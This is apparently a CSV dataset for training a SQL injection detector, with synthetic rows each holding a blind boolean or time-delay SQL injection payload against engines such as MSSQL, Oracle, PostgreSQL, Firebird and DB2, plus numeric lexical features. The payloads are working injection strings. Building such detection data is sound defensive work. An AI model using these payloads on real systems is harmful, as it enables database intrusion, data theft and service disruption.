id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000319,attack,boolean,"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",nearest_attack_euclidean,R000278,0.6330854734991547,221.54345383796104,34.181675274140076,3.8007950963082218,125.4534021931206,20.0,56.363350548280145,19.726701096560294,0.5662670116680628,0.09032729580890075,0.25447587267814165,0.08892981984489476,2.363350548280148,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,6.0,5.363350548280148,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.181675274140074,2.0,0.0,1.0,1.181675274140074,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,5.181675274140074
SMOTE_000320,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",nearest_attack_euclidean,R000581,0.7390328269393077,142.5181140407423,31.58926235993252,4.238280603416948,81.23221292020244,8.410737640067481,36.642950560269924,16.232212920202446,0.5704015299936073,0.05896979291914084,0.25695910834993047,0.11366956873732142,4.0,0.0,0.0,0.0,1.0,1.4107376400674818,0.0,4.0,0.0,0.0,2.410737640067482,2.4107376400674823,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000321,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R000772,1.198449085381285,111.75361221085024,29.048307087780998,3.700130703259841,41.536230315835745,10.560383859726246,44.12076771945249,15.536230315835748,0.37372299735963327,0.09321294206667334,0.3940761778478772,0.1389878827258162,3.512076771945249,0.0,0.0,0.0,1.0,1.512076771945249,0.0,7.5120767719452495,0.0,1.0,1.0,2.512076771945249,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.512076771945249,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.512076771945249
SMOTE_000322,attack,boolean,"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",nearest_attack_euclidean,R000123,0.27892105660875205,61.65629779336548,21.5312595586731,3.6225848770884057,13.0,16.0,22.12503823469239,10.531259558673097,0.21185657791359583,0.26074655743211794,0.3567308523653995,0.17066601228888673,0.0,3.9999999999999996,1.0,0.0,1.0,2.0,0.0,2.5312595586730984,0.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000323,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000341,0.06322292064902486,154.1646398750736,33.94512004164214,4.160255834041962,74.0,18.0,42.164639875073576,20.0,0.48002502634921085,0.11676284424710534,0.27347563579578893,0.1297364936078948,0.0,0.9725600208210707,2.0,0.0,1.0,2.0,0.0,5.027439979178929,0.0,5.0,4.0,5.0,0.0,0.9725600208210708,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000324,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R000741,0.6100164079097219,233.36800954475274,34.0,3.583042517029024,65.47203817901087,27.0,103.26398091049455,37.63199045524728,0.28053688941794797,0.11569758523699931,0.44250457722554115,0.16126094811951164,0.0,3.9999999999999996,0.0,0.0,0.0,1.6319904552472835,0.0,22.0,0.0,1.0,3.0,7.6319904552472835,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,7.0
SMOTE_000325,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000667,0.08440530447061537,112.19422079566743,28.0,4.177930157951103,74.19422079566745,3.0000000000000018,23.0,12.0,0.661122338542935,0.026753499588715673,0.2051101635134867,0.10701399835486264,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000326,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",nearest_attack_euclidean,R000196,1.8676282580137629,368.3953500844401,30.66905192632462,3.3270095074034347,100.68336348427235,47.0,168.69767504222006,52.01431155794772,0.27330708755487043,0.12772464082183768,0.45787804398428755,0.14109022763900433,2.67620770529848,0.0,0.0,0.0,0.0,2.66905192632462,0.0,35.33810385264924,0.0,0.0,1.0,12.66905192632462,0.66905192632462,0.0,0.0,0.33094807367538004,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.6690519263246202,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.66905192632462
SMOTE_000327,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000204,0.45483485919162303,59.730397871688155,23.13480106415592,3.735803538453789,18.865198935844077,13.539204256623679,20.460795743376323,6.865198935844083,0.3158144760311982,0.22697042616823984,0.3423302842807839,0.11488481351977807,1.0,0.0,0.0,0.0,0.0,1.1348010641559196,0.0,2.7303978716881607,0.0,0.0,0.8651989358440804,1.2696021283118393,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.1348010641559198,0.0,0.1348010641559198,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.2696021283118397
SMOTE_000328,attack,boolean,-6030%'  )   or 3038  =  3038,nearest_attack_euclidean,R000174,0.6866669031829534,32.2241627557204,13.381784038165893,2.990149692147116,2.0,12.0,12.763568076331786,5.460594679388633,0.0627889602380835,0.3767337614285009,0.39071058108852263,0.16976669724489293,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.460594679388632,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000329,attack,boolean,"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R000589,0.1620300676861588,173.72079460637326,35.10267149458012,3.9138344196838744,52.82137195664098,24.564693220190676,64.23205793496147,32.10267149458012,0.3040667628721334,0.14116707054353717,0.3694463201408964,0.18531984644343297,3.8973285054198774,0.0,0.0,0.0,0.0,2.0,0.0,12.308014483740369,0.0,1.9486642527099383,1.1026714945801228,11.897328505419878,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2566787364503069,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.256678736450307
SMOTE_000330,attack,boolean,"1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683",nearest_attack_euclidean,R000657,0.31718593899388664,80.52708385202197,20.610833540808787,3.079549886389408,10.221667081617568,21.0,40.0,9.305416770404394,0.12639661615123426,0.260990240974614,0.49712426852307434,0.11548887435107735,0.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.3054167704043931,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000331,attack,boolean,"1%' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000518,0.06483176990409151,135.08398194332165,28.0,4.005982701871878,66.0,10.0,36.89269101214724,22.191290931174407,0.48935932799132775,0.07414535272595875,0.27223690679051843,0.16425841249219503,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.191290931174409,1.9999999999999998,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000332,attack,boolean,"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'jmub'  =  'jmub",nearest_attack_euclidean,R000718,0.09931424587752044,148.80525481618665,31.097372591906677,4.239481008956291,82.31839185665325,8.902627408093322,39.58423555144007,18.0,0.5531481640367915,0.0598203072848571,0.2660661169398389,0.12096541173851255,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.194745183813356,0.0,0.0,2.9026274080933225,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000333,attack,boolean,"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000194,0.7313899436521425,156.55415840254304,36.0,4.243250656231051,77.92778879660928,16.0,45.626369605933775,17.0,0.49793689633609606,0.10221043142341002,0.29125408885312076,0.10859858338737315,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.518052800847682,0.0,0.0,2.0,5.4819471991523185,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.4819471991523183,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.4819471991523185
SMOTE_000334,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000395,2.443699609799821,31.93471323752935,14.532643381235323,3.1960940047096225,4.336783093823385,7.32643381235323,11.86942647505871,8.40206985629403,0.13350034157719085,0.23450917823323347,0.37009295049025065,0.261897529699325,0.0,2.8694264750587086,2.5326433812353226,0.0,0.0,1.0,0.0,1.4673566187646765,0.5326433812353228,0.0,0.0,3.532643381235323,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000335,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",nearest_attack_euclidean,R000296,1.8484129354258056,118.0344476489604,28.068895297920783,4.049903182207888,64.58662821247529,8.689462069282158,31.206685893762355,13.551671473440589,0.5480846823162867,0.07322873799893208,0.2639747941065996,0.11471178557818172,3.0,0.0,0.0,0.0,0.48277617551980395,0.0,0.0,5.586119122400981,0.0,0.5172238244801961,2.517223824480196,0.48277617551980434,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.4827761755198039,0.0,0.0,0.4827761755198038,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.517223824480196,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.482776175519804
SMOTE_000336,attack,boolean,1   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  1233  =  1233,nearest_attack_euclidean,R000656,0.8085966718319079,85.44555822706604,15.94054620526883,2.6923629107786997,7.940546205268831,21.0,45.78223290826419,10.722779113533024,0.09332968221078669,0.24579779585155218,0.5354215441876453,0.12545097775001574,0.0,0.0,0.0,0.0,0.7227791135330242,2.0,0.0,7.445558227066049,0.0,0.2772208864669757,0.2772208864669756,2.7227791135330244,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000337,attack,boolean,"-6629%""   )    )     )   or 8571  =  8571--",nearest_attack_euclidean,R000544,0.29213942052879877,42.01227338320953,14.83537889720159,2.9696157473660603,2.0,12.0,19.34151558880636,8.670757794403182,0.04775327041708416,0.28651962250250507,0.45973582819263525,0.20599127888777555,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.8353788972015908,0.8353788972015899,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000338,attack,boolean,-7786'   )    )    or 9323  =  9323#,nearest_attack_euclidean,R000173,0.29458953077621164,38.01640760036551,14.403281520073103,2.904525776142099,2.0,12.0,17.61312608029241,6.403281520073103,0.052823295934464054,0.31693977560678444,0.4619309060194299,0.16830602243932155,1.0,0.0,1.0,0.0,0.0,1.0,0.0,2.4032815200731026,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000339,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",nearest_attack_euclidean,R000239,0.2217495468174858,134.74513056600088,29.549026113200178,4.064262520012451,72.0,11.098052226400352,38.098052226400355,13.549026113200176,0.5348784757312453,0.08204446164864863,0.2826238900478656,0.10045317257224046,0.0,0.0,0.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.774513056600088,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000340,attack,boolean,-3339' or 8571  =  8571--,nearest_attack_euclidean,R000386,0.4391856677653724,24.725415355479612,12.274584644520372,3.3430505573462925,2.13729232226018,11.58812303321944,6.000000000000007,5.0,0.08692430842703552,0.46782276793866173,0.24286523107325605,0.20238769256104674,1.0,0.0,2.862707677739813,0.0,0.0,1.0,0.0,0.0,0.13729232226018673,0.0,0.0,3.862707677739813,1.0,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.13729232226018673,0.8627076777398133,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000341,attack,boolean,-7021' or 3038  =  3038,nearest_attack_euclidean,R000138,0.9446346818596698,23.0,12.0,3.2077070644704735,2.0,12.0,6.000000000000007,3.0,0.08695652173913043,0.5217391304347826,0.2608695652173913,0.13043478260869565,0.6900574932792988,0.3099425067207012,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.6900574932792988,0.3099425067207013,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000342,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,0.7937724421183194,103.68052918640572,28.275325246259158,3.840619240025703,37.13506798004885,13.758441748753054,36.96104371882633,15.825975738777478,0.3609769481489433,0.13984772337475787,0.348039564505094,0.15113576397120487,3.2415582512469467,0.0,0.0,0.0,0.0,1.0,0.0,7.309092241271372,0.758441748753053,1.0,2.5168834975061065,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.2415582512469467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7584417487530531,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000343,attack,boolean,"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000286,1.44040929408374,138.40366533373052,30.0,4.0174503949449365,73.09512266670848,6.190245333416952,40.475613333542384,18.642684000062715,0.5301398701801705,0.043937964569645396,0.29133451424388057,0.1345876510063036,0.0,3.547561333354238,0.0,0.0,1.0,1.5475613333542382,0.0,5.095122666708476,1.547561333354238,0.0,2.452438666645762,2.5475613333542384,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.5475613333542381,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.5475613333542384
SMOTE_000344,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R000347,0.04562619362326603,65.0,24.278366543195016,3.9701016993206473,24.999999999999996,13.0,18.0,9.0,0.38461538461538464,0.2,0.27692307692307694,0.13846153846153847,4.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000345,attack,boolean,"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon",nearest_attack_euclidean,R000743,0.6561903515716173,95.14698215464709,26.85301784535291,3.4434271924055584,21.482414276282324,16.0,43.035171447435346,14.629396430929418,0.22645165191690314,0.16827076260932838,0.45155204519133374,0.1537255402824347,0.0,3.9999999999999996,1.0,0.0,0.0,1.0,0.0,7.258792861858836,0.0,0.3706035690705816,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000346,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",nearest_attack_euclidean,R000292,0.10488233731946835,136.1548929227239,32.84634416776798,4.268908468794602,78.42379062912993,8.0,34.84634416776798,14.884758125825986,0.5758694240111464,0.05882328509160323,0.25601573460418137,0.10929155629306897,0.0,3.8847581258259853,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.9615860419419953,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.9615860419419953
SMOTE_000347,attack,boolean,1   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  1233  =  1233,nearest_attack_euclidean,R000656,0.5031456974957074,85.6665563468508,15.333774612596786,2.63068025974567,7.167052786022182,21.0,46.666225387403216,10.833278173425402,0.08393787396412009,0.24515535945682906,0.5444768381323142,0.12642992844673667,0.0,0.0,0.0,0.0,0.8332781734254018,2.0,0.0,7.666556346850804,0.0,0.1667218265745981,0.16672182657459822,2.8332781734254016,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
